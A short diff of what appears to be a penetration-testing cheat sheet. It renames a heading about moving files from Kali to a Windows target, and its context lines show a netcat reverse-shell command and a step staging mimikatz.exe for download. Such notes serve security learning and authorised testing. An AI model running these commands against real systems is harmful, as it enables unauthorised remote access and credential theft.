@@ -52,7 +52,7 @@ FILENAME=/bin/sh
 nc -nv $ADDRESS $PORT -e $FILENAME
 ```
 
-## Downloading files from windows
+## Downloading files from Kali to Windows target
 ### Setup http web server:
 ```console
 cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
